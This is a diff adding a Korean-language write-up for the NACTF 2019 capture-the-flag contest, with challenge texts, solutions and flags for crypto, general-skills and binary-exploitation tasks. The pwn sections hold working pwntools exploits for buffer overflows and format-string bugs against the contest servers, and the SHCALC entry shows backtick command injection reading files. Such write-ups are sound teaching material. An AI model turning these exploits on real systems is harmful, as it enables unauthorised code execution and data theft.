@@ -1,6 +1,46 @@
 # NACTF (Newark Academy's Computer Science Club)
 with team `༼ つ ◕_◕ ༽つ 뀨` (43/1335)  
 
+## Cryptography
+[Vyom's Soggy Croutons](#Vyom-s-Soggy-Croutons)
+[Loony Tunes](#Loony-Tunes)
+[Super Duper AES](#Super-Duper-AES)
+[Dr.J's Group Test Randomizer:Board Problem #0](#Dr.J's-Group-Test-Randomizer:Board-Problem-#0)  
+[Dr.J's Group Test Randomizer:Board Problem #1](#Dr.J's-Group-Test-Randomizer:Board-Problem-#1)
+[Dr.J's Group Test Randomizer:BBOB #2](#Dr.J's-Group-Test-Randomizer:BBOB-#2)
+[Reversible Sneaky Algorithm #0](#Reversible-Sneaky-Algorithm-#0)
+[Reversible Sneaky Algorithm #1](#Reversible-Sneaky-Algorithm-#1)
+[Reversible Sneaky Algorithm #2](#Reversible-Sneaky-Algorithm-#2)
+
+## Reverse Engineering
+[Keygen](#Keygen)
+
+## General Skills
+[Intro to Flags](#Intro-to-Flags)
+[Join the Discord](#Join-the-Discord)
+[What the HEX?](#What-the-HEX?)
+[Off-base](#Off-base)
+[Cat over the wire](#Cat-over-the-wire)
+[Grace's HashBrowns](#Grace's-HashBrowns)
+[SHCALC](#SHCALC)
+[Hwang's Hidden Handiwork](#Hwang's-Hidden-Handiwork)
+[Get a GREP #0!](#Get-a-GREP-#0!)
+[Get a GREP #1!](#Get-a-GREP-#1!)
+[Cellular Evolution #0:Bellsprout](#Cellular-Evolution-#0:Bellsprout)
+[Cellular Evolution #1:Weepinbell](#Cellular-Evolution-#1:Weepinbell)
+[Cellular Evolution #2:VikTreebel](#Cellular-Evolution-#2:VikTreebel)
+[Cellular Evolution #3:BBOB](#Cellular-Evolution-#3:BBOB)
+
+
+## Binary Exploitation
+[BufferOverflow #0](#BufferOverflow-0)
+[BufferOverflow #1](#BufferOverflow-1)
+[BufferOverflow #2](#BufferOverflow-2)
+[Format #0](#Format-0)
+[Format #1](#Format-1)
+[Loopy #0](#Loopy-0)
+[Loopy #1](#Loopy-1)
+
 ## Forensics
 [Least Significant Avenger](#Least-Significant-Avenger)  
 [The MetaMeme](#The-MetaMeme)  
@@ -17,6 +57,459 @@ with team `༼ つ ◕_◕ ༽つ 뀨` (43/1335)
 [Scooby Doo](#Scooby-Doo)  
 [Dexter's Lab](#dexter-s-lab)  
 [Sesame Street](#sesame-street)  
+
+# Vyom's Soggy Croutons
+```
+Vyom was eating a CAESAR salad with a bunch of wet croutons when he sent me this:
+
+ertkw{vk_kl_silkv}
+
+Can you help me decipher his message?
+```
+## solve
+카이사르 암호다. `key 17`로 복호화가 된다.
+## flag
+`nactf{et_tu_brute}`
+
+# Loony Tunes
+```
+Ruthie is very inhumane. She keeps her precious pigs locked up in a pen. I heard that this secret message is the password to unlocking the gate to her PIGPEN. Unfortunately, Ruthie does not want people unlocking the gate so she encoded the password. Please help decrypt this code so that we can free the pigs!
+
+P.S. "_" , "{" , and "}" are not part of the cipher and should not be changed
+
+P.P.S the flag is all lowercase
+```
+## solve
+이미지 한개가 주어지는데 첨보는 암호였다. 문제에서 눈에 띄었던 `PIGPEN`에 대해서 검색해보니 [온라인 en/decrypt 사이트](https://www.boxentriq.com/code-breaking/pigpen-cipher)가 나왔다. 복호화 하면 플래그가 나온다.
+## flag
+`nactf{th_th_th_thats_all_folks}`
+
+# Super Duper AES
+```
+The Advanced Encryption Standard (AES) has got to go. Spencer just invented the Super Duper Advanced Encryption Standard (SDAES), and it's 100% unbreakable. AES only performs up to 14 rounds of substitution and permutation, while SDAES performs 10,000. That's so secure, SDAES doesn't even use a key!
+```
+# Dr.J's Group Test Randomizer:Board Problem #0
+```
+Dr. J created a fast pseudorandom number generator (prng) to randomly assign pairs for the upcoming group test. Leaf really wants to know the pairs ahead of time... can you help him and predict the next output of Dr. J's prng? Leaf is pretty sure that Dr. J is using the middle-square method.
+
+nc shell.2019.nactf.com 31425
+
+The server is running the code in class-randomizer-0.c. Look at the function nextRand() to see how numbers are being generated!
+```
+# Dr.J's Group Test Randomizer:Board Problem #1
+```
+Dr. J is back with another group test, and he patched his prng so we can't predict the next number based on the previous one! Can still you help Leaf predict the next output of the prng?
+
+nc shell.2019.nactf.com 31258
+
+So we can't use the output to predict the next number... but I wonder if the numbers will repeat?
+```
+# Dr.J's Group Test Randomizer:BBOB #2
+```
+This is it. The last group test of the year. Dr. J patched his prng again so numbers won't repeat, so I guess Leaf won't get to know the group test pairs ahead of time... oh WEYL. Who knew middle square could make such a good prng?
+
+nc shell.2019.nactf.com 31382
+
+Widynski wrote, "This RNG is nonlinear and hence the only attack would probably be brute force." Keyword: "probably"
+```
+# Reversible Sneaky Algorithm #0
+```
+Yavan sent me these really large numbers... what can they mean? He sent me the cipher "c", the private key "d", and the public modulus "n". I also know he converted his message to a number with ascii. For example:
+
+"nactf" --> \x6e61637466 --> 474080310374
+
+Can you help me decrypt his cipher?
+```
+# Reversible Sneaky Algorithm #1
+```
+Lori decided to implement RSA without any security measures like random padding. Must be deterministic then, huh? Silly goose!
+
+She encrypted a message of the form nactf{****} where the redacted flag is a string of 4 lowercase alphabetical characters. Can you decrypt it?
+
+As in the previous problem, the message is converted to a number by converting ascii to hex.
+
+The flag seems pretty short... can you brute-force it?
+
+(Note: By brute-force, we do not mean brute-forcing the flag submission - do not SUBMIT dozens of flags. Brute force on your own computer.)
+```
+
+# Reversible Sneaky Algorithm #2
+```
+Oligar was thinking about number theory at AwesomeMath when he decided to encrypt a message with RSA. As a mathematician, he made various observations about the numbers. He told Molly one such observation:
+
+a^r ≡ 1 (mod n)
+
+He isn't SHOR if he accidentally revealed anything by telling Molly this fact... can you decrypt his message?
+
+Source code, a and r, public key, and ciphertext are attached.
+
+I'm pretty SHOR Oligar was building a quantum computer for something...
+```
+# Keygen
+```
+Can you figure out what the key to this program is?
+```
+# Intro to Flags
+```
+Your flag is nactf{w3lc0m3_t0_th3_m4tr1x}.
+```
+## flag
+`nactf{w3lc0m3_t0_th3_m4tr1x}`
+
+# Join the Discord
+```
+Go to the NACTF home page and find the link to the Discord server. A flag will be waiting for you once you join. So will Austin.
+```
+## solve
+디스코드 들어가면 플래그가 있다.
+## flag
+`nactf{g00d_luck_h4v3_fun}`
+
+# What the HEX?
+```
+What the HEX man! My friend Elon just posted this message and I have no idea what it means >:( Please help me decode it:
+
+https://twitter.com/kevinmitnick/status/1028080089592815618?lang=en
+
+Leave the text format: no need to add nactf{} or change punctuation/capitalization
+```
+## solve
+위 링크로 들어가면 케빈미트닉이랑 일론머스크랑 대화한 내용이 나온다. 둘다 변태인지 헥스 데이터로 대화한다. ascii로 바꾸면 플래그가 나온다.
+## flag
+`I was. Sorry to have missed you.`
+
+# Off-base
+```
+It seems my friend Rohan won't stop sending cryptic messages and he keeps mumbling something about base 64. Quick! We need to figure out what he is trying to say before he loses his mind...
+
+bmFjdGZ7YV9jaDRuZzNfMGZfYmE1ZX0=
+```
+## solve
+base64 디코딩하면 플래그가 나온다.
+## flag
+`nactf{a_ch4ng3_0f_ba5e}`
+
+# Cat over the wire
+```
+Open up a terminal and connect to the server at shell.2019.nactf.com on port 31242 and get the flag!
+
+Use this netcat command in terminal:
+
+nc shell.2019.nactf.com 31242
+```
+## solve
+nc 접속하면 플래그를 준다.
+## flag
+`nactf{th3_c4ts_0ut_0f_th3_b4g}`
+
+# Grace's HashBrowns
+```
+Grace was trying to make some food for her family but she really messed it up. She was trying to make some hashbrowns but instead, she made this:
+
+f5525fc4fc5fdd42a7cf4f65dc27571c
+
+I guess Grace is a really bad cook. But at least she tried to add some md5 sauce.
+
+remember to put the flag in nactf{....}
+```
+## solve
+md5 복호화 하면 나온다.
+## flag
+`nactf{grak}`
+
+# SHCALC
+```
+John's written a handy calculator app - in bash! Too bad it's not that secure...
+
+Connect at nc shell.2019.nactf.com 31214
+```
+## solve
+shcalc라는 이름 답게 쉘에서 실행되는 계산기인듯 하다. 이것저것 넣어보다가 백쿼터에서 에러가 발생했고, 이를 이용해서 `command injeciton`을 했다.
+```bash
+> `ls -al`
+sh: 1: arithmetic expression: expecting EOF: "total 16
+drwxr-xr-x 1 root root 4096 Sep 13 05:38 .
+drwxr-xr-x 1 root root 4096 Sep 21 23:35 ..
+-rwxrwxrwx 1 root root  125 Sep 13 05:38 calc.sh
+-rw-r--r-- 1 root root   29 Sep 13 05:38 flag.txt"
+> `cat calc.sh`
+sh: 1: arithmetic expression: expecting primary: "#!/bin/sh
+
+cat <<EOF
+shcalc v1.1
+EOF
+
+echo -n '> '
+while read input; do
+        env -i sh -c "echo \$(($input))"
+        echo -n '> '
+done"
+>
+sh: 1: arithmetic expression: expecting primary: ""
+> `cat flag.txt`
+sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
+>
+```
+## flag
+`nactf{3v4l_1s_3v1l_dCf80yOo}`
+
+# Hwang's Hidden Handiwork
+```
+Hwang was trying to hide secret photos from his parents. His mom found a text file with a secret string and an excel chart which she thinks could help you decrypt it. Can you help uncover Hwang's Handiwork?
+
+Of course, the nobler of you may choose not to do this problem because you respect Hwang's privacy. That's ok, but you won't get the points.
+```
+## decrypt
+txt 파일에 이상한 암호문이 적혀있었고, 추가로 encrypt 테이블로 보이는 csv 파일이 주어졌다. 아래 코드를 통해 복호화할 수 있었고, 그 결과로 URL을 얻어냈다.
+```python
+import csv
+
+
+cipher = "SccLJ0ddkSGy=PP=kM8JMDmPCcMCcymPedh9_r_GwDtt.::/.1TS_Ba:uU9KNpzir:VcNEVK/PPDXCImKlqK8rqtfOAvisA2MIikfjEq1ReFNC/gi_bf5fbrOSxrODf"
+
+f = open("substitution.csv")
+f = csv.reader(f)
+csv_data = [i[1:] for i in f]
+
+plaintext = csv_data[0]
+ciphertext = csv_data[1]
+
+plain = ""
+for i in cipher:
+	plain += plaintext[ciphertext.index(i)]
+
+print(plain)
+
+# https://lh3.googleusercontent.com/vdx0x3krzzyWWSy4ahxBiWJGdIQR9j0W_tQL_ISoorqnAcIKCIu0Czw-ZbjTZ8eAjlwfLC4Dm6QnSPjx5w=w50-h10-rw
+```
+그러나 이 이미지는 깨진건지 잘 보이지 않았다.
+
+## solve
+이 URL에 한가지 이상한 점은 리소스 맨 마지막에 인자처럼 보이는 부분이 있다는 것이다. w는 width h는 height로 보인다. 실제로 저 값을 다르게 주면 이미지가 잘 복원이 된다. 나는 250과 50으로 주었다.
+
+## flag
+`nactf{g00gl3_15nt_s3cur3_3n0ugh}`
+
+# Get a GREP #0!
+```
+Vikram was climbing a chunky tree when he decided to hide a flag on one of the leaves. There are 10,000 leaves so there's no way you can find the right one in time... Can you open up a terminal window and get a grep on the flag?
+```
+## solve
+zip 파일이 주어졌고, 압축이 안걸려있었다. 그래서 바로 `strings`로 뽑아서 `grep`으로 잡았다.
+``` bash
+➜ strings bigtree.zip | grep na
+bigtree/branch8/branch3/branch5/leaf8351.txtnactf{v1kram_and_h1s_10000_l3av3s}
+```
+## flag
+`nactf{v1kram_and_h1s_10000_l3av3s}`
+
+# Get a GREP #1!
+```
+Juliet hid a flag among 100,000 dummy ones so I don't know which one is real! But maybe the format of her flag is predictable? I know sometimes people add random characters to the end of flags... I think she put 7 random vowels at the end of hers. Can you get a GREP on this flag?
+```
+## solve
+문제에서 제공한 조건에 맞추어 grep 정규식을 이용했다.
+``` bash
+➜ grep -e "[aeiou]\{7\}}" flag.txt 
+nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}
+```
+## flag
+`nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}`
+
+# Cellular Evolution #0:Bellsprout
+```
+Vikram Loves Bio!
+
+He loves it so much that he started growing Cellular Automata in a little jar of his. He hopes his Cellular Automata can be as strong as HeLa Cells. He has so many cells growing that he decided to hire you to help him with his project. Can you open these files and follow Vikram's instructions?
+
+Use the flag format nactf{...}
+```
+# Cellular Evolution #1:Weepinbell
+```
+Apparently, Vikram was not satisfied with your work because he hired a new assistant: Eric. Eric has been doing a great job with managing the cells but he has allergies. Eric sneezed and accidentally messed up the order of the cells. Can you help Eric piece the cells back together?
+
+btw, flag is all lowercase
+```
+# Cellular Evolution #2:VikTreebel
+```
+Thanks to your help, Eric and Vikram fixed their cells. Business is booming, and they're now a multinational megacorporation! They need bigger cells to meet demand: Eric used the rule "sum8" to evolve his cells to their next stage of evolution! Sum8 sets each cell to the sum of the cells around it (see examples). Eric sent us his evolved cells, but we want to know what they looked like before! Can you turn back time and get the flag?
+```
+# Cellular Evolution #3:BBOB
+```
+Dr. J was teaching Linear Algebra when he decided to buy some of Eric and Vik's cells! He cultivated the cells, drew a secret flag, and performed one step of "sum8". Luckily, he learned from Eric's mistake and added random 0's, 1's, and 2's in the background so nobody can reverse the message. Can you still get the flag?
+
+The20thDuc
+
+=====
+Submit your answer with the flag format nactf{}. Use all lowercase alphabetical characters and include underscores between words.
+=====
+It would take a really really really long time to solve this by hand... can you write a program to reverse it?
+=====
+Remember that the simulator wraps around in both the horizontal and vertical directions.
+=====
+This takes about 5 minutes to run on a laptop.
+=====
+The numbers in inpattern.txt are hexadecimal.
+```
+
+
+
+
+
+
+# BufferOverflow #0
+```
+The close cousin of a website for "Question marked as duplicate"
+
+Can you cause a segfault and get the flag?
+
+shell.2019.nactf.com:31475
+```
+## exploit
+c 코드를 보면 win에서 쉘을 띄워준다. 버퍼에 입력받는 과정에서 BOF가 발생하므로 gdb를 열어서 buf의 실제 할당 크기와 win의 주소를 구했다. 이후 overflow를 일으켜서 return 주소를 덮어씌우면 쉘이 따진다.
+``` python
+from pwn import *
+
+#x = process("./bufover-0")
+x = remote("shell.2019.nactf.com", 31475)
+win = 0x80491c2
+
+x.recvuntil("Type something>")
+
+payload = "a"*(0x18+4)
+payload += p32(win)
+
+x.sendline(payload)
+x.interactive()
+```
+## flag
+`nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`
+
+# BufferOverflow #1
+```
+The close cousin of a website for "Question marked as duplicate" - part 2!
+
+Can you redirect code execution and get the flag?
+
+Connect at shell.2019.nactf.com:31462
+```
+## solve
+1번과 같은 원리로 코드를 짰다.
+## flag
+`nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`
+
+# BufferOverflow #2
+```
+The close cousin of a website for "Question marked as duplicate" - part 3!
+
+Can you control the arguments to win() and get the flag?
+
+Connect at shell.2019.nactf.com:31184
+```
+## exploit
+코드를 보면 인자를 검사하는 부분이 있다. 스택 프레임을 고려해서 인자를 넘기면 된다. 첫번째 인자가 long형인지 모르고 삽질했는데 주의하자.
+``` python
+from pwn import *
+
+context.log_level = "debug"
+
+#x = process("./bufover-2")
+x = remote("shell.2019.nactf.com", 31184)
+win = 0x80491c2
+
+x.recvuntil("Type something>")
+
+payload = "a"*(0x18+4)
+payload += p32(win)
+payload += "aaaa" # return addr after win()
+payload += p64(0x14b4da55) # long argv1
+payload += p32(0xf00db4be) # int argv2
+
+x.sendline(payload)
+x.interactive()
+```
+## flag
+`nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}`
+
+# Format #0
+```
+Someone didn't tell Chaddha not to give user input as the first argument to printf() - use it to leak the flag!
+
+Connect at shell.2019.nactf.com:31782
+```
+## exploit
+코드를 보면 이번에는 오버플로우가 일어나지 않는다. 대신 `print()` 부분에서 `FSB(Format String Bug)`가 발생한다. 이를 이용해서 `vuln`의 `stack frame`을 벗어나 `main`의 `buf` 변수를 읽으면 된다.
+``` python
+from pwn import *
+
+def reverse(hexa):
+	for i in range(9-len(hexa)):
+		hexa = "0"+hexa
+	string = ""
+	for i in range(0, len(hexa)-1, 2):
+		print(hexa[i:i+2])
+		string += chr(int(hexa[i:i+2], 16))
+	return string[::-1]
+
+start = 31
+flag = ""
+for i in range(start, 50):
+	#x = process("./format-0")
+	x = remote("shell.2019.nactf.com", 31782)
+	p = "%"+str(i)+"$p"
+	x.sendline(p)
+	x.recvuntil("You typed: ")
+	res = x.recvline()[2:]
+	flag += reverse(res)
+	print(flag)
+	
+print flag
+```
+## flag
+`nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}`
+
+# Format #1
+```
+printf can do more than just read memory... can you change the variable?
+
+Connect at nc shell.2019.nactf.com 31560
+```
+## exploit
+이 코드에서는 win() 함수가 쉘을 실행시켜주기 때문에 win으로 넘어가기 위한 조건문을 성립시키기 위해 `FSB`로 num의 주소에 접근해서 값을 변경해주면 된다.
+``` python
+from pwn import *
+
+x = remote("shell.2019.nactf.com", 31560)
+#x = process("./format-1")
+
+payload = "%42c%24$n"
+
+x.recvuntil("Type something>")
+x.sendline(payload)
+x.interactive()
+```
+## flag
+`nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}`
+
+# Loopy #0
+```
+This program is quite short, but has got printf and gets in it! This shouldn't be too hard, right?
+
+Connect at nc shell.2019.nactf.com 31283
+```
+# Loopy #1
+```
+Same program as Loopy #0, but someone's turned on the stack protector now!
+
+Connect at nc shell.2019.nactf.com 31732
+```
+
+
+
+
+
+
+
 
 
 # Least Significant Avenger
